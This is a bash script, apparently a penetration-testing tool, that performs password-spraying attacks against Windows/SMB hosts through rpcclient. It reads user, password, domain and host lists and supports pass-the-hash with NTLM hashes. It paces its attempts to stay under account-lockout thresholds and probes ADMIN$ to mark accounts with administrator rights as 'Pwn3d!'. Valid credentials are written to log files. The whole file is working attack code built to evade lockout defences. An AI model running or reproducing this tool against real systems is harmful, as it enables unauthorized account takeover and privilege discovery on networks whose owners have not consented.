#!/usr/bin/env bash
#
#    Copyright (C) 2018 - 2019 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# TODO:
# * Beautify script outputs
# * Implement support for IP ranges
# * Implement share spidering

# enable stricter programming rules (turns some bugs into errors)
# set -Eeuo pipefail

declare -gr PROGNAME=$(basename $0)
declare -gr PROGBASENAME=${PROGNAME%%.*}
declare -gr PROGDIR=$(dirname ${BASH_SOURCE[0]})
declare -gr PROGVERSION=0.7dev

declare -gr DATE_FORMAT='+%d/%m/%Y-%H:%M:%S'

declare -ga RPCCLIENT_OPTIONS=('--signing=on')

declare -g  CFLAG=false
declare -gr CREDS_SEPARATOR=':'

declare -g  DEBUG=false
declare -ga DOMAINS
declare -ga HOSTS
declare -gi LOCKOUT_DURATION=1800 # 30 mins
declare -gi LOCKOUT_THRESHOLD=3
declare -g  OUT_FOLDER="${PROGDIR}/logs"
declare -ga PASSWORDS
declare -ga USERS
declare -g  VERBOSE=false

function print()        { printf "%s » %s\n" "${PROGBASENAME}" "${@}"; }
function printAttempt() { if [[ $VERBOSE = true || $1 = true ]]; then printf "%s » %-16.16s %-32.32s -> %s\n" "${PROGBASENAME}" "$2" "$3" "$4"; fi; }
function printDate()    { printf "%s > %s » %s\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "${@}"; }
function printDebug()   { if [[ $DEBUG = true ]]; then declare -p $1; echo ""; fi; }
function printError()   { printf "%s > error » %s\n" "${PROGBASENAME}" "${@}"; }
function printLockout() { printf "%s > %s » The attack has been paused for %s seconds (approx. %s minutes) to prevent accounts from \
being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$LOCKOUT_DURATION" "$(($LOCKOUT_DURATION / 60))"; }

trap quit INT

function quit() {
    print "Trapped CTRL-C"
    exit 130
}

function parseArgs() {
    local clag=false
    local CFlag=false
    local dFlag=false
    local DFlag=false
    local hFlag=false
    local HFlag=false
    local laFlag=false
    local pFlag=false
    local PFlag=false
    local uFlag=false
    local UFlag=false

    while (($# > 0))
    do
        case $1 in
            --help)
                usage
                exit 0
                ;;  
            -v)
                VERBOSE=true
                ;;            
            -vv)
                DEBUG=true
                VERBOSE=true
                ;;
            -V|--version)
                banner
                exit 0
                ;;
            -c)
                CFLAG=true # boolean used in spray()
                cFlag=true
                USERS=$(awk -F "$CREDS_SEPARATOR" '{ print $1 }' <<< $2)
                PASSWORDS=$(awk -F "$CREDS_SEPARATOR" '{ print $2 }' <<< $2)
                ;;
            -C)
                CFLAG=true # boolean used in spray()
                CFlag=true
                OPTARG=$(realpath $2)

                if [[ -f $OPTARG ]]
                then
                    utemp=$(mktemp XXXXXXXXXXXXXXXX)
                    ptemp=$(mktemp XXXXXXXXXXXXXXXX)
                    awk -F "$CREDS_SEPARATOR" '{ print $1 }' $OPTARG > $utemp
                    awk -F "$CREDS_SEPARATOR" '{ print $2 }' $OPTARG > $ptemp
                    loadArray $utemp USERS
                    loadArray $ptemp PASSWORDS
                    rm -f $utemp $ptemp
                else
                    printError "$OPTARG is not a valid file"
                    exit 1
                fi
                ;;
            -d)
                dFlag=true
                DOMAINS=($2)
                ;;
            -D)
                DFlag=true
                loadArray $2 DOMAINS
                ;;
            -h)
                hFlag=true
                HOSTS=($2)
                ;;
            -H)
                HFlag=true
                loadArray $2 HOSTS
                ;;
            -la) # local authentication
                laFlag=true
                DOMAINS=('WORKGROUP')
                ;;
            -ld)
                LOCKOUT_DURATION=$2
                ;;
            -lt) 
                LOCKOUT_THRESHOLD=$2
                ;;
            -o)
                OUT_FOLDER=$2
                ;;
            -p)
                pFlag=true
                PASSWORDS=($2)
                ;;
            -P)
                PFlag=true
                loadArray $2 PASSWORDS
                ;;
            --pth)
                RPCCLIENT_OPTIONS+=('--pw-nt-hash')
                ;;       
            -u)
                uFlag=true
                USERS=($2)
                ;;
            -U)
                UFlag=true
                loadArray $2 USERS
                ;;       
            -*)
                printf "%s: illegal option -- %s\n" "$PROGNAME" "$OPT"
                exit 1
                ;;
        esac

        shift
    done

    # check the presence of mandatory arguments
    if [[ (($dFlag = false && $DFlag = false) && $laFlag = false) || ($hFlag = false && $HFlag = false) || (($cFlag = false && $CFlag = false) && (($pFlag = false && $PFlag = false) || ($uFlag = false && $UFlag = false))) ]]
    then
        printf "%s: missing mandatory option(s)\n" "${PROGNAME}"
        printf "%s: type '%s --help' for more information\n" "${PROGNAME}" "${PROGNAME}"
        exit 1
    fi

    # check the presence of mutually exclusive arguments
    ## string vs file user input
    if [[ ($cFlag = true && $CFlag = true) || ($dFlag = true && $DFlag = true) || ($hFlag = true && $HFlag = true) || ($pFlag = true && $PFlag = true) || ($uFlag = true && $UFlag = true) ]]
    then
        printf "%s: -c and -C, -d and -D, -h and -H, -p and -P, -u and -U cannot be used together\n" "${PROGNAME}"
        printf "%s: type '%s --help' for more information\n" "${PROGNAME}" "${PROGNAME}"
        exit 1
    ## credentials vs username/password
    elif [[ ($cFlag = true || $CFlag = true) && (($pFlag = true || $PFlag = true) || ($uFlag = true || $UFlag = true)) ]]
    then
        printf "%s: -c/-C and -p/-P or -u/-U cannot be used together\n" "${PROGNAME}"
        printf "%s: type '%s --help' for more information\n" "${PROGNAME}" "${PROGNAME}"
        exit 1
    ## local vs domain authentication
    elif [[ $laFlag = true && ($dFlag = true || $DFlag = true) ]]
    then
        printf "%s: -d/-D and -la cannot be used together\n" "${PROGNAME}"
        printf "%s: type '%s --help' for more information\n" "${PROGNAME}" "${PROGNAME}"
        exit 1
    fi
}

function usage() {
cat <<- USAGE

Usage: $PROGNAME [OPTIONS]

Perform password spraying attacks. Spray and pray!

Mandatory arguments:
    -c              credentials (format {username}:{password})
    -C              file containing the credentials (one entry per line) or folder containing the files containing the credentials(s)
    -d              domain name
    -D              file containing the domain name(s) (one entry per line) or folder containing the files containing the domain name(s)
    -h              host
    -H              file containing the host(s) (one entry per line) or folder containing the files containing the host(s)
    -p              password
    -P              file containing the password(s) (one entry per line) or folder containing the files containing the password(s)
    -u              user
    -U              file containing the user(s) (one entry per line) or folder containing the files containing the user(s)

Authentication arguments:
    -la             enable local machine authentication
    --pth           enable Pass-the-Hash attacks by sending passwords as NTLM hashes 

Lockout arguments:
    -ld             lockout duration expressed in seconds (default to 1800) 
    -lt             lockout treshold (default to 3 attempts)

Optional arguments:
    -o              directory where the log files will be written to
    -v              print every password guessing attempts
    -vv             print every password guessing attempts and the script parameters details
    -V, --version   show the banner/version

Examples:
    bash $PROGNAME -d CORP -h 192.168.0.101 -p Corp007! -u jbloggs
    bash $PROGNAME -d CORP -h 192.168.0.1 -P passwords.lst -u jbloggs
    bash $PROGNAME -v -la -H hostnames.txt -pth -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -u jbloggs 
USAGE
}

function writeLocked()  {
    if ! [[ -f "${OUT_FOLDER}/locked.log" ]]
    then
        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/locked.log"
    fi

    printf "%s %s\n" "$(date "$DATE_FORMAT")" "${@}" >> "${OUT_FOLDER}/locked.log"
}

function writeResult() { 
    if ! [[ -f "${OUT_FOLDER}/$2" ]]
    then
        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/$2.log"
    fi

    printf "%s %s\n" "$(date "$DATE_FORMAT")" "$1" >> "${OUT_FOLDER}/${2}.log"
}

function banner() {
    local -ar vars=('DOMAINS' 'HOSTS' 'PASSWORDS' 'USERS' 'LOCKOUT_DURATION' 'LOCKOUT_THRESHOLD' 'OUT_FOLDER' 'VERBOSE')

cat <<- BANNER
${PROGBASENAME^^} v${PROGVERSION}
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER

    printDebug
}

function loadArray() {
    local -n _vars=$2 # referenced copy of the array passed to the function
    local -a vars

    if [[ -d $(realpath $1) ]]
    then
        for i in $(realpath $1)/*
        do
            readarray -t var < $(realpath "$i")
            _vars+=(${vars[@]})
            unset vars
        done
    elif [[ -f $(realpath $1) ]]
    then
        readarray -t _vars < $(realpath $1)
    else
        printError "$1 is not a valid directory or file"
        exit 1
    fi
}

# If domain is not WORKSTATION stop on per user basis otherwise stop on per machine basis
function spray() {
    local -i counter=0
    local    isAdmin=false  # boolean for admin creds
    local    vFlag=false    # boolean verbose (enforce account lockouts and succesfull attempts printing)

    local    var1
    local    var2
    local    var3
    
    local    password
    local    username

    local -a _PASSWORDS     # local copy of PASSWORDS
    local -a _USERS         # local copy of USERS

    # remove blank and empty entries
    _DOMAINS=(${DOMAINS[@]})
    _HOSTS=(${HOSTS[@]})
    _PASSWORDS=(${PASSWORDS[@]})    
    _USERS=(${USERS[@]})

    for domain in ${_DOMAINS[@]}
    do
        for host in ${_HOSTS[@]}
        do
            for ((i=0; i <= ((${#_USERS[@]} - 1)); i++))
            do 
                user=${_USERS[i]}
                isAdmin=false

                for ((j=0; j <= ((${#_PASSWORDS[@]} - 1)); j++))
                do 
                    if [[ $CFLAG = true ]]
                    then
                        password=${_PASSWORDS[i]}
                    else
                        password=${_PASSWORDS[j]}
                    fi
                    
                    isAdmin=false

                    ((counter++))

                    var1="${host}:139"
                    var2="${domain}\\${user}:${password}"

                    res=$(rpcclient "${RPCCLIENT_OPTIONS[@]}" --workgroup="$domain" -U "${user}%${password}" -c 'getusername' "$host")

                    if [[ $res =~ 'Cannot connect to server.' ]]
                    then
                        error=$(echo $res | awk '{print $NF}')
                        var3="LOGON FAILED (${error})"

                        if [[ $error = 'NT_STATUS_ACCOUNT_LOCKED_OUT' ]]
                        then
                            writeLocked "${domain}\\${user}"
                            vFlag=true
                        fi
                    else
                        res=$(rpcclient "${RPCCLIENT_OPTIONS[@]}" --workgroup="$domain" -U "${user}%${password}" -c 'netsharegetinfo ADMIN$' "$host")

                        if [[ $res =~ 'netname' ]]
                        then
                            isAdmin=true
                            var3='LOGON SUCCESS (Pwn3d!)'
                        else
                            var3='LOGON SUCCESS'
                        fi

                        vFlag=true
                        writeResult "${domain}\\${user}:${password} $isAdmin" "$host"
                    fi

                    printAttempt "$vFlag" "$var1" "$var2" "$var3"

                    # we assume thats creds contains valid username:password
                    if [[ $CFLAG = true ]]
                    then
                        break
                    elif [[ $domain = "WORKGROUP" ]]
                    then
                        continue
                    else
                        if ! (( $counter % $LOCKOUT_THRESHOLD ))
                        then
                            printLockout
                            sleep $LOCKOUT_DURATION
                        fi
                    fi
                done
            done
        done
    done
}

function main() {
    STARTTIME=$(date '+%s')
    printDate "Starting password spraying attack..."

    spray

    ENDTIME=$(date '+%s')
    ELAPSED=$(($ENDTIME - $STARTTIME))
    printDate "Password spraying attack took $(($ELAPSED / 60)) minutes to complete" 
}

parseArgs "$@"
banner
main
